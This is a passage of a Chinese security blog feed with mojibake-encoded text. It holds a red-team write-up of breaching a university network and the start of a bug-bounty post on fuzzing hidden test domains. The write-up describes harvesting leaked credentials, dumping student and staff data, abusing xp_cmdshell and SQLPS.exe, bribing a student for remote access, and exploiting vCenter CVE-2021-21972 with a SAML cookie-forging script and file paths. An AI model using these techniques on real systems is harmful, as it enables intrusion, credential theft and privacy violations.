      <link href="/2023/02/28/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%8D%81-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B1%82%E5%B1%82%E7%AA%81%E7%A0%B4%E7%9A%84%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
      <url>/2023/02/28/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%8D%81-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B1%82%E5%B1%82%E7%AA%81%E7%A0%B4%E7%9A%84%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ¬æ–‡ç®€å•è®°è¿°äº†ä¸€ä¸‹æœ¬äººåœ¨æŸæ”»é˜²æ¼”ç»ƒè¿‡ç¨‹ä¸­ä¸€æ¬¡å±‚å±‚çªç ´çš„æœ‰è¶£ç»å†</p><p>æŠ€æœ¯æ€§åœ¨æ”»é˜²å®æˆ˜ä¸­è™½ç„¶ä¸€èˆ¬ï¼Œä½†æ˜¯å±‚å±‚çªç ´çš„è¿‡ç¨‹æ¯”è¾ƒæœ‰æ„æ€ï¼Œå¹¶ç”¨åˆ°äº†æ¯”è¾ƒå¤šçš„æ€è·¯ï¼Œå› æ­¤åˆ†äº«ç»™å¤§å®¶</p><h2 id="0x01-SSOè´¦å·è·å–"><a href="#0x01-SSOè´¦å·è·å–" class="headerlink" title="0x01 SSOè´¦å·è·å–"></a>0x01 SSOè´¦å·è·å–</h2><p>ç”±äºç›®æ ‡æ˜¯æŸå¤§å­¦ï¼Œå¯¹å¤–å¼€æ”¾çš„æœåŠ¡åŸºæœ¬ä¸Šéƒ½æ˜¯ä¸€äº›é™æ€Webé¡µé¢ï¼Œæ²¡ä»€ä¹ˆå¤ªå¤šåˆ©ç”¨ç‚¹</p><p>å› æ­¤è·å–ä¸€ä¸ªè¯¥å¤§å­¦çš„SSOè´¦å·å°±æ˜¾å¾—å°¤ä¸ºé‡è¦~</p><p>æœ¬äººä½¿ç”¨è¯¥å¤§å­¦çš„åŸŸåã€ä»¥åŠå¸¸è§çš„æœç´¢å¯†ç å…³é”®è¯ï¼Œè°ƒç”¨Githubçš„apiåœ¨Githubä¸­å®šä½åˆ°äº†å°±è¯»è¯¥å¤§å­¦çš„å…³é”®ç”¨æˆ·</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225239.jpg" alt="image-20220618100944824"></p><p>è¯¥åŒå­¦å®‰å…¨æ„è¯†è¾ƒä¸ºè–„å¼±ï¼Œç»å¸¸å°†è´¦å·å¯†ç ç¡¬ç¼–ç åœ¨ç¨‹åºå†…ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬è‹¦è‹¦å¯»è§…çš„äººæ‰</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225602.jpg" alt="image-20220618100922784"></p><p>ç»“åˆä»–åœ¨å…¶ä»–é¡¹ç›®ä¸­ç¡¬ç¼–ç çš„å­¦å·ï¼Œæˆ‘ä»¬æˆåŠŸåˆ©ç”¨ä»–çš„å­¦å·+å¯†ç ç™»é™†è¯¥å¤§å­¦SSOç³»ç»Ÿå’Œå­¦ç”Ÿvpnç³»ç»Ÿ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225007.jpg" alt="image-20220618101339023"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225367.jpg" alt="image-20220618103125720"></p><p>æœ¬æ¥ä»¥ä¸ºå¯ä»¥è¿›é©»å†…ç½‘äº†ï¼Œç»“æœå‘ç°å­¦ç”ŸVPNé™¤äº†è®¿é—®ä¸€äº›å­¦æœ¯èµ„æºï¼Œå•¥ä¹Ÿå¹²ä¸äº†</p><p>å¥½åœ¨è¿›å»SSOäº†ï¼Œé‚£ä¹ˆåé¢æ¥è¿‘é¶æ ‡ä¹‹è·¯å°±ä¼šæ›´åŠ è½»æ¾ï¼Œç°åœ¨è‡ªç„¶è¦æŠŠç€åŠ›ç‚¹æ”¾åœ¨SSOèƒ½è®¿é—®åˆ°çš„ç³»ç»Ÿæ¼æ´æŒ–æ˜ä¸Š</p><h2 id="0x02-æŸç³»ç»Ÿæ¥å£åˆ©ç”¨æµ‹è¯•tipsè·å–å¤§é‡ä¿¡æ¯"><a href="#0x02-æŸç³»ç»Ÿæ¥å£åˆ©ç”¨æµ‹è¯•tipsè·å–å¤§é‡ä¿¡æ¯" class="headerlink" title="0x02 æŸç³»ç»Ÿæ¥å£åˆ©ç”¨æµ‹è¯•tipsè·å–å¤§é‡ä¿¡æ¯"></a>0x02 æŸç³»ç»Ÿæ¥å£åˆ©ç”¨æµ‹è¯•tipsè·å–å¤§é‡ä¿¡æ¯</h2><p>èµ°äº†ä¸€éSSOèƒ½è®¿é—®çš„ç³»ç»Ÿ</p><p>å‘ç°æŸé¡¹ç›®ç”³è¯·å¤„ï¼Œå¯ä»¥æœç´¢å­¦æ ¡å…¶ä»–åŒå­¦çš„ä¿¡æ¯</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225911.jpg" alt="image-20220618101937376"></p><p>å¦‚å›¾ï¼Œæ¥å£åœ¨æµé‡ä¸­æ˜¯è¿™æ ·è¡¨ç°çš„</p><p>æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªæµ‹è¯•tipsï¼Œå°†å…¶ä¸­çš„å…³é”®é”®ç½®ç©ºï¼Œæˆ–è€…ä½¿ç”¨é€šé…ç¬¦*ï¼Œå‘ç°å¯ä»¥æˆåŠŸè¿”å›å…¨æ ¡ä¸‰ä¸‡å¤šåå­¦ç”Ÿçš„ä¿¡æ¯</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225483.jpg" alt="image-20220618102208679"></p><p>å‡­æ­¤æˆæœï¼Œä»…èƒ½å¾—ä¸€ç‚¹å¯æ€œçš„åˆ†æ•°ï¼Œè¿˜å¾—ç»§ç»­æ¥æ’¸</p><p>æˆ‘ç»§ç»­åœ¨ç³»ç»Ÿé‡ç¿»æ‰¾æ¥å£ï¼Œç»ˆäºå‘ç°äº†ä¸€ä¸ªå¯ä»¥æœç´¢å­¦æ ¡è€å¸ˆçš„æ¥å£</p><p>åŒæ ·çš„ä½¿ç”¨åˆšåˆšçš„tipsï¼Œåœ¨å…³é”®çš„é”®å¤„ç½®ç©ºé”®å€¼æˆ–ä½¿ç”¨*ï¼Œè¿™æ¬¡è¿æ°”å¾ˆå¥½ï¼Œè¿”å›çš„ä¿¡æ¯ä¸­ï¼Œç”šè‡³å‡ºç°äº†æ‰€æœ‰è€å¸ˆçš„å·¥å·å’Œmd5åŠ å¯†çš„å¯†ç </p><p>ç”šè‡³åŒ…æ‹¬ssoç®¡ç†å‘˜çš„å¯†ç ã€‚ã€‚ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225031.jpg" alt="image-20220618102809575"></p><p>è§£äº†ä¸€ä¸‹adminçš„å¯†ç ï¼Œéå¸¸é—æ†¾ï¼Œè§£ä¸å¼€ï¼Œä¸ç„¶æ¸¸æˆå°±ç›´æ¥ç»“æŸäº†~</p><p>ä½†æˆ‘ä»¬ç°åœ¨æŒæ¡äº†å¤§é‡è€å¸ˆçš„å·¥å·ï¼Œå¯†ç (åŒ…æ‹¬è´Ÿè´£è¿ç»´çš„è€å¸ˆ)ï¼Œé‚£ä¹ˆæˆ‘ä»¬åé¢è¿›é©»å†…ç½‘çš„å·¥ä½œå°±ä¼šé¡ºåˆ©å¾ˆå¤š</p><h2 id="0x03-è¿›é©»DMZåŒºå¹¶è·å–å†…ç½‘è·³æ¿"><a href="#0x03-è¿›é©»DMZåŒºå¹¶è·å–å†…ç½‘è·³æ¿" class="headerlink" title="0x03 è¿›é©»DMZåŒºå¹¶è·å–å†…ç½‘è·³æ¿"></a>0x03 è¿›é©»DMZåŒºå¹¶è·å–å†…ç½‘è·³æ¿</h2><p>æˆ‘ä»¬åšäº†å¾ˆé•¿æ—¶é—´çš„ä¿¡æ¯æœé›†ï¼Œæ‰¾åˆ°äº†è¯¥å­¦æ ¡å¼€æ”¾åœ¨å¤–ç½‘ç»™è¿ç»´äººå‘˜ä½¿ç”¨çš„DMZåŒºVPN</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225449.jpg" alt="image-20220618103620549"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225800.jpg" alt="image-20220618105819143"></p><p>æˆ‘ä»¬ç›´æ¥ç”¨åˆšåˆšè·å–åˆ°è´Ÿè´£è¿ç»´çš„è€å¸ˆçš„è´¦å·å¯†ç ç™»å½•ï¼Œå‘ç°ä¸€ç›´ä¸å¥½ä½¿â€¦</p><p>ç»“æœè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯†ç ç«Ÿç„¶å’Œå·¥å·æ˜¯ä¸€è‡´çš„â€¦.çœŸæ˜¯æ— è¯­â€¦</p><p>éšåå°±æˆåŠŸæ¥å…¥äº†è¯¥å­¦æ ¡DMZåŒºVPN</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225274.jpg" alt="image-20220618103938618"></p><p>è¿›å…¥DMZåŒºåï¼Œæˆ‘ä»¬ç®€å•åšäº†ä¸€ä¸‹å¼±å£ä»¤æ‰«ææ¢æµ‹ï¼Œå‘ç°äº†ä¸€å°SqlServerçš„å¼±å£ä»¤</p><p>ç›´æ¥é€šè¿‡æ¢å¤æ‰§è¡Œxp_cmdshellï¼Œå‘ç°è¿˜æ˜¯ç®¡ç†å‘˜æƒé™</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225706.jpg" alt="image-20220618104248653"></p><p>ä½†æ˜¯åˆ—è¿›ç¨‹çš„æ—¶å€™å‘ç°äº†ä¸‡æ¶çš„æŸ60</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225084.jpg" alt="image-20220618104339199"></p><p>è¯•äº†è¯•è‡ªå·±ä¹‹å‰çš„certutilä¸‹è½½æ–‡ä»¶ç»•è¿‡æ–¹æ³•ï¼Œå› ä¸ºä¹‹å‰äº¤äº†360SRCï¼Œå·²ç»è¢«ä¿®å¤äº†ï¼ŒTMDç›´æ¥è¢«æ‹¦</p><p>ä½†æ˜¯ä»”ç»†ä¸€æƒ³ï¼ŒSqlServerä¸­æ˜¯å­˜åœ¨LOL binçš„ï¼Œå¯ä»¥å®ç°ç™½åˆ©ç”¨æ‰§è¡Œpowershell</p><pre><code class="powershell">LOL binC:\Program files (x86)\Microsoft SQL Server\xxx\Tools\Binn\SQLPS.exeC:\Program files (x86)\Microsoft SQL Server\xxx\Tools\Binn\SQLPS.exe whoami</code></pre><p>é€šè¿‡æ­¤å§¿åŠ¿ï¼ŒæˆåŠŸä¸Šçº¿CS</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225462.jpg" alt="image-20220618104803788"></p><p>å¦‚æ­¤ä¸€æ¥ï¼Œè®¿é—®å†…ç½‘æ ¸å¿ƒåŒºçš„è·³æ¿å°±æœ‰äº†~</p><h2 id="0x04-è¢«è¸¢å‡ºå†…ç½‘ä¸æ”¶ä¹°å­¦æ ¡å†…é¬¼"><a href="#0x04-è¢«è¸¢å‡ºå†…ç½‘ä¸æ”¶ä¹°å­¦æ ¡å†…é¬¼" class="headerlink" title="0x04 è¢«è¸¢å‡ºå†…ç½‘ä¸æ”¶ä¹°å­¦æ ¡å†…é¬¼"></a>0x04 è¢«è¸¢å‡ºå†…ç½‘ä¸æ”¶ä¹°å­¦æ ¡å†…é¬¼</h2><p>è¿˜æ²¡ç­‰å¼€å¿ƒä¸€ä¼šï¼Œçªç„¶å‘ç°CSçš„è¿›ç¨‹å·²ç»è¢«ä¸‹æ‰äº†ï¼Œå¹¶ä¸”DMZåŒºè´¦å·ä¹Ÿè¢«è¸¢ä¸‹çº¿å¹¶æ”¹å¯†ç äº†</p><p>ä¼°è®¡æ˜¯ç›®æ ‡æœºæœ‰ä¸»æœºå®‰å…¨è®¾å¤‡ï¼Œæ£€æµ‹åˆ°äº†è¿›ç¨‹ä¸­çš„CSå†…å­˜ç‰¹å¾æˆ–æµé‡ç‰¹å¾ã€‚ã€‚ã€‚</p><p>çº¿ç´¢å…¨æ–­ï¼Œè®©äººé™·å…¥äº†æ²‰æ€ï¼Œä¸è¿‡è½¬å¿µä¸€æƒ³ï¼Œå†…ç½‘ä»£ç†å¥—ä»£ç†ä¹Ÿæ˜¯å¡çš„è¦æ­»ï¼Œè¿˜ä¸å¦‚æƒ³æƒ³åŠæ³•å¦‚ä½•ç›´æ¥è·å–å†…ç½‘æ ¸å¿ƒåŒºçš„è®¿é—®æƒé™</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225018.gif" alt="æ‘¸è„‘è¢‹è¡¨æƒ…åŒ…"></p><p>æˆ‘ä»¬äºæ˜¯åœ¨å’¸é±¼ä¸Šå¼€å§‹å¯»æ‰¾çŒç‰©ï¼Œå‘ç°äº†å°±è¯»äºè¯¥å¤§å­¦çš„æŸå­¦ç”Ÿ</p><p>è¯¥å­¦ç”Ÿå’¸é±¼ä¸ŠæŒ‚çš„å…·ä½“å†…å®¹å¿˜è®°æˆªå›¾äº†ï¼Œå¤§ä½“æ„æ€æ˜¯â€<strong>æˆ‘æ˜¯xxxå¤§å­¦çš„å­¦ç”Ÿï¼Œå¯ä»¥ä¸ºå¤§å®¶æä¾›xxxå¤§å­¦çš„æœ‰å…³å¸®åŠ©ï¼Œè€ƒç ”ï¼Œç”Ÿæ´»ç­‰ç­‰ç­‰ï¼Œè§†éš¾åº¦æ”¶è´¹10-50</strong>â€œ</p><p>æˆ‘ä»¬ç›´æ¥åŠ ä»–è”ç³»æ–¹å¼ï¼Œç»™ä»–è½¬äº†50ã€‚</p><p>è¯æœ¯å¦‚ä¸‹</p><pre><code class="text">æˆ‘ï¼šä½ å¥½ä½ å¥½ï¼Œæˆ‘æ˜¯xxå¤§å­¦çš„å­¦ç”Ÿï¼Œç°åœ¨åœ¨å¤–é¢ï¼Œå›ä¸å»å­¦æ ¡ï¼Œæƒ³ç”¨ä¸‹ä½ çš„ç”µè„‘ï¼Œè®¿é—®å­¦æ ¡å†…çš„æ•™åŠ¡ç³»ç»Ÿï¼Œç»™æ‚¨50å…ƒç­”è°¢å¯¹æ–¹ï¼šå“¦å“¦å¯ä»¥ï¼Œä½ çœ‹çœ‹æ€ä¹ˆæ•´æˆ‘ï¼šä½ ä¸‹ä¸ªå‘æ—¥è‘µï¼Œç„¶åæŠŠä¸»æœºå·å’Œå¯†ç å‘ç»™æˆ‘å°±å¥½å¯¹æ–¹ï¼šokok</code></pre><p>å°±è¿™æ ·ï¼Œæˆ‘ä»¬è¿ä¸Šäº†è¿™ä¸ªäºŒå‚»å­çš„å‘æ—¥è‘µ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225633.jpg" alt="image-20220618111131625"></p><p>ç„¶åç›´æ¥ç”¨ä»–çš„cmdï¼ŒæŠŠæƒé™ç»™åˆ°CSï¼Œåšå¥½æƒé™ç»´æŒ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225987.jpg" alt="image-20220618110447005"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225324.jpg" alt="image-20220618110346861"></p><p>æŠŠéš§é“ä¼ å‡ºæ¥ï¼Œå‘ç°å­¦ç”Ÿçš„PCç«Ÿç„¶å¯ä»¥ç›´æ¥è®¿é—®æ ¸å¿ƒåŒºã€‚ã€‚ã€‚éšååœ¨å†…ç½‘åˆå¼€å§‹äº†æ‰«æï¼Œæ’¸äº†ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„ç³»ç»Ÿï¼Œæ¯”å¦‚æµ·åº·æŸè®¾å¤‡çš„RCEï¼Œwebç³»ç»Ÿçš„æ³¨å…¥ï¼Œç½‘å…³ç­‰ç­‰ä¸œè¥¿ï¼Œä½†éƒ½æ²¡æ³•åå¼¹shellã€‚ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225427.jpg" alt="image-20220618111536680"></p><p>å½“æ—¶åˆå‘ç°äº†ä¸€ä¸ªSSHå¼±å£ä»¤ï¼Œå¯ç»™æˆ‘ä»¬é«˜å…´åäº†ï¼ŒäºŒè¯ä¸è¯´è¿è¿‡å»</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225715.jpg" alt="image-20220618111452695"></p><p>å½“çœ‹åˆ°è¿™ä¸€å¹•çš„æ—¶å€™ï¼Œä¸€èº«å†·æ±—ï¼Œå› ä¸ºéå¸¸æ¸…æ¥šï¼Œè‡ªå·±è¸©åˆ°å†…ç½‘èœœç½äº†ï¼Œåˆè¦å¯„äº†ã€‚ã€‚ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225087.jpg" alt="image-20220618105955678"></p><p>æœç„¶ä¸å‡º20åˆ†é’Ÿï¼Œé‚£ä½åŒå­¦å°±å‘æ¥äº†å¾®ä¿¡</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225460.jpg" alt="image-20220618110022087"></p><p>æ°”ç…æˆ‘ä¹Ÿï¼Œåé¢æƒ³ç»§ç»­ç”¨é‡‘é’±æ”¶ä¹°ï¼Œé“äº†æ­‰ï¼Œè¯´è‡ªå·±ä¸€ä¸å°å¿ƒä¼ é”™è½¯ä»¶äº†ï¼Œåˆç»™ä»–è½¬äº†20å—é’±ï¼Œæƒ³å†ç”¨ä¸€é˜µ</p><p>å¯è°çŸ¥</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225867.jpg" alt="image-20220618112218432"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225166.jpg" alt="image-20220618112348348"></p><p>æ°”ç…æˆ‘ä¹Ÿï¼Œç«Ÿç„¶ä¸è®²æ­¦å¾·</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225560.jpg" alt="img"></p><h2 id="0x05-è¿‘æºæ¸—é€ç›´æ£é»„é¾™"><a href="#0x05-è¿‘æºæ¸—é€ç›´æ£é»„é¾™" class="headerlink" title="0x05 è¿‘æºæ¸—é€ç›´æ£é»„é¾™"></a>0x05 è¿‘æºæ¸—é€ç›´æ£é»„é¾™</h2><p>çœ¼çœ‹ç€æ‰€æœ‰èƒ½é€šå‘å†…ç½‘æ ¸å¿ƒåŒºçš„è·¯å¾„å…¨å¯„äº†ï¼Œæˆ‘ä»¬åªèƒ½æƒ³åŠæ³•å‡ºå¥‡åˆ¶èƒœï¼Œæ‘‡äººå»è¿‘æºæ¸—é€</p><p>å«ç”²æ–¹æ´¾äº†äº†ä¸ªäººï¼Œæ··è¿›å­¦æ ¡å†…çš„å›¾ä¹¦é¦†ï¼Œç”¨ä¹‹å‰è·å–åˆ°çš„å­¦ç”Ÿssoè´¦å·æ¥å…¥æ ¡å›­ç½‘</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225817.jpg" alt="image-20220618112848638"></p><p>å¦‚æ­¤ä¸€æ¥ï¼Œæˆ‘ä»¬å°±æœ‰äº†ç¨³å®šä¸”ä¸æ˜“å¯Ÿè§‰çš„å†…ç½‘é€šé“ğŸ˜‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„æ“ä½œäº†ï¼Œæ¼æ‰«æ ¸å¿ƒç½‘æ®µï¼Œå‘ç°äº†docker apiæœªæˆæƒå’Œvcenterçš„RCE</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225232.jpg" alt="image-20220619004532359"></p><p>å¯æ§åˆ¶æ•°åä¸ªé•œåƒ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225771.jpg" alt="image-20220619001950533"></p><p>æ ¸å¿ƒåŒºVCenterå­˜åœ¨CVE-2021-21972æ¼æ´ï¼Œå¯ç›´æ¥å†™å…¥Webshell</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225132.jpg" alt="image-20220619002143315"></p><p>éšåå¯åˆ©ç”¨Vcenterçš„shellæƒé™å®ç°cookieä¼ªé€ </p><p>ä½¿ç”¨è„šæœ¬</p><p><a href="https://github.com/horizon3ai/vcenter_saml_login/blob/main/vcenter_saml_login.py">https://github.com/horizon3ai/vcenter_saml_login/blob/main/vcenter_saml_login.py</a></p><pre><code class="shell">python3 vcenter_saml_login.py -t Vcenterå†…ç½‘ip -p data.mdb</code></pre><pre><code>data.mdbè·¯å¾„windowsï¼šC:/ProgramData/VMware/vCenterServer/data/vmdird/data.mdblinuxï¼š/storage/db/vmware-vmdir/data.mdb</code></pre><p>ä½¿ç”¨ç”Ÿæˆçš„cookieè¿›é©»VCenter</p><p>åˆ†æ•°åˆ·æ»¡ï¼Œæ¶¦äº†~</p><h2 id="0x06-æœ«è¨€"><a href="#0x06-æœ«è¨€" class="headerlink" title="0x06 æœ«è¨€"></a>0x06 æœ«è¨€</h2><p>æœ¬æ–‡æ²¡æœ‰è¿‡å¤šçš„æŠ€æœ¯æ€§ä¸œè¥¿ï¼Œä¸»è¦æ˜¯è·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹è‡ªå·±æ‰“æ”»é˜²è¢«â€å›´è¿½å µæˆªâ€œçš„ç»å…¸æ¡ˆä¾‹ï¼Œç»™å¥‹æ–—åœ¨æ”»é˜²ä¸€çº¿çš„å…„å¼ŸåŠ æ²¹é¼“åŠ²</p><p>æƒé™æ‰äº†ï¼Œè¢«è¸¢å‡ºå†…ç½‘ï¼Œè«è¦ç°å¿ƒæ°”é¦ï¼Œ<strong>è§æ‹›æ‹†æ‹›ï¼Œæ‰æ˜¯æ”»é˜²çš„ä¹è¶£æ‰€åœ¨</strong></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(ä¹)-å·§ç”¨ç›®æ ‡åŸŸåç‰¹ç‚¹æŒ–æ˜æŸæ–°ä¸ŠSRCå››å¤„RCE</title>
      <link href="/2023/02/22/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B9%9D-%E5%B7%A7%E7%94%A8%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D%E7%89%B9%E7%82%B9%E6%8C%96%E6%8E%98%E6%9F%90%E6%96%B0%E4%B8%8ASRC%E5%9B%9B%E5%A4%84RCE/"/>
      <url>/2023/02/22/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B9%9D-%E5%B7%A7%E7%94%A8%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D%E7%89%B9%E7%82%B9%E6%8C%96%E6%8E%98%E6%9F%90%E6%96%B0%E4%B8%8ASRC%E5%9B%9B%E5%A4%84RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x02-ç¼˜èµ·"><a href="#0x02-ç¼˜èµ·" class="headerlink" title="0x02 ç¼˜èµ·"></a>0x02 ç¼˜èµ·</h2><p>æ—©ä¸Šæ‰“å¼€å¾®ä¿¡æ— èŠæ°´ç¾¤ï¼Œå¶ç„¶é—´å‘ç°æ–°ä¸Šäº†å®¶SRC</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223925.png" alt="image-20230222002842186"></p><p>æ–°ä¸Šçš„SRCä¸€èˆ¬éƒ½æ˜¯ç»†çš®å«©è‚‰çš„å¤„å­ï¼Œæœªç»ä¸‡äººéª‘ï¼Œå¾—æ‰‹ä¹Ÿæ›´åŠ å®¹æ˜“ï¼Œæˆ‘ä»¬æ¥ä¸€æ¢ç©¶ç«Ÿ</p><h2 id="0x03-èµ„äº§æœé›†åˆ°é»˜è®¤ç§˜é’¥è¢«æ”¹-å±±ç©·æ°´å°½"><a href="#0x03-èµ„äº§æœé›†åˆ°é»˜è®¤ç§˜é’¥è¢«æ”¹-å±±ç©·æ°´å°½" class="headerlink" title="0x03 èµ„äº§æœé›†åˆ°é»˜è®¤ç§˜é’¥è¢«æ”¹ å±±ç©·æ°´å°½"></a>0x03 èµ„äº§æœé›†åˆ°é»˜è®¤ç§˜é’¥è¢«æ”¹ å±±ç©·æ°´å°½</h2><p>ç®€å•ç”¨ç›®æ ‡çš„certä¿¡æ¯æ”¶é›†äº†ä¸€ä¸‹ç½‘ç»œç©ºé—´çš„èµ„äº§</p><p>å‘ç°äº†ç›®æ ‡ä¸å°‘çš„åŸŸåéƒ½é‡‡ç”¨â€œçŸ­æ¨ªçº¿å‘½åæ³•â€ï¼Œä¸€èˆ¬æ¥è¯´å¤§å‚ç”¨è¿™ç§å‘½åæ³•ä¾¿äºåˆ†è¾¨å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ç¯å¢ƒè¿˜æ˜¯è›®å¤šçš„</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223938.jpg" alt="0956758F-07AE-43B8-8921-ECE12FE26002.png"></p><p>æ€»ç»“äº†ä¸€ä¸‹ï¼Œå¸¸è§çš„å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ç¯å¢ƒåŸŸåä¸­å¸¸è§è¯å¦‚ä¸‹</p><pre><code>uattestdevpreprpro...</code></pre><p>éšåä»èµ„äº§åˆ—è¡¨ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªçœ‹èµ·æ¥åƒç®¡ç†apiæ¥å£çš„åŸŸåè¿›è¡Œè®¿é—®</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223978.png" alt="image-20230222000155876"></p><p>æ ¹æ®é¡µé¢å›æ˜¾ï¼Œç»“åˆä¹‹å‰å¤šå¹´çš„æµ‹è¯•ç»éªŒï¼Œæ¨æ–­æ­¤å¤„ä½¿ç”¨äº†Apache Apisix</p><p>ä¹‹å‰å¤ç°è¿‡Apache Apisixé»˜è®¤ç§˜é’¥æ·»åŠ æ¶æ„è·¯ç”±å¯¼è‡´çš„RCEæ¼æ´ï¼Œæ­¤å¤„ç›´æ¥å‡†å¤‡ä¸€è¯•</p><p>å‘ç°ç›´æ¥å¯„äº†ï¼Œç›®æ ‡<strong>ç”Ÿäº§ç¯å¢ƒ</strong>çš„apiæŠŠè¿™ä¸ªé»˜è®¤çš„keyç»™æ”¹æ‰äº†ï¼Œå¯¼è‡´æ²¡æ³•åˆ›å»ºæ¶æ„è·¯ç”±</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223525.png" alt="image-20230222000627789"></p><p>éš¾é“å°±è¿™æ ·ç»“æŸäº†ï¼Ÿé‚£æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘ä»¬çš„é£æ ¼</p><h2 id="0x04-ç†é¡ºæ€è·¯-å‘ç°éšè—çš„æµ‹è¯•ç¯å¢ƒèµ„äº§"><a href="#0x04-ç†é¡ºæ€è·¯-å‘ç°éšè—çš„æµ‹è¯•ç¯å¢ƒèµ„äº§" class="headerlink" title="0x04 ç†é¡ºæ€è·¯-å‘ç°éšè—çš„æµ‹è¯•ç¯å¢ƒèµ„äº§"></a>0x04 ç†é¡ºæ€è·¯-å‘ç°éšè—çš„æµ‹è¯•ç¯å¢ƒèµ„äº§</h2><p>åˆšåˆšæˆ‘ä»¬åœ¨è¿›è¡Œèµ„äº§æœé›†æ—¶ï¼Œå·²ç»å‘ç°äº†ç›®æ ‡åŸŸåçš„ç»Ÿä¸€å‘½åç‰¹ç‚¹</p><p>é‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥å€ŸåŠ©FUZZåŸŸåæ¥æå‡ºä¸€ç‚¹ç«èŠ±ï¼Œå°è¯•å‘æ˜éšè—èµ„äº§</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223502.png" alt="image-20230222001842874"></p><pre><code class="shell">./ffuf -w domain_test -u https://gateway-xxx-xxx-FUZZ.xxx.com -mc 404 -t 1</code></pre><p>æœ€ç»ˆæˆåŠŸå‘ç°æŒ‰ç…§ç›®æ ‡çš„ç›®æ ‡çš„å››å¤„éç”Ÿäº§ç¯å¢ƒçš„éšè—èµ„äº§</p><h2 id="0x05-æµ‹è¯•ç¯å¢ƒé»˜è®¤keyçš„åŸç½ªåˆ°RCE"><a href="#0x05-æµ‹è¯•ç¯å¢ƒé»˜è®¤keyçš„åŸç½ªåˆ°RCE" class="headerlink" title="0x05 æµ‹è¯•ç¯å¢ƒé»˜è®¤keyçš„åŸç½ªåˆ°RCE"></a>0x05 